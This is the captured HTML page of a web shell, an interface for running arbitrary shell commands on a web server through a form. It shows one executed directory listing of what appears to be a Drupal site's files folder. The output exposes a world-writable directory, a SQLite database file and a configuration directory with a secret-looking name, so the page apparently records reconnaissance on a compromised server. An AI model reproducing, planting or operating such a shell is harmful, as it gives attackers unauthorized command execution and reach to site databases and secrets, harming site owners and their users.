<!DOCTYPE html>
<html lang="en">
<!-- By Artyum (https://github.com/artyuum) -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        pre,
        input,
        button {
            padding: 10px;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="ls -al /var/www/html/sites/default/files"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

                    <h2>Output</h2>
                            <pre>total 7332
drwxrwxrwx 7 www-data www-data    4096 Nov 27 10:31 .
dr-xr-xr-x 1 www-data www-data    4096 Nov 26 22:58 ..
-rw-r--r-- 1 www-data www-data 7471104 Nov 27 10:31 .ht.sqlite
-r--r--r-- 1 www-data www-data     487 Nov 26 22:44 .htaccess
drwxr-xr-x 3 www-data www-data    4096 Nov 26 22:43 config_pRg6RG03hrbzYzqTwB7FNudt7nildgsI9WU4fLJ01vw7JJs9PPBSobCDxM2NLFRcSIj0D1SfVg
drwxrwxr-x 2 www-data www-data    4096 Nov 26 23:05 css
drwxrwxr-x 2 www-data www-data    4096 Nov 26 22:45 js
drwxrwxrwx 3 www-data www-data    4096 Nov 26 22:44 php
drwxrwxr-x 2 www-data www-data    4096 Nov 26 22:44 styles
</pre>
                        </main>
</body>
</html>
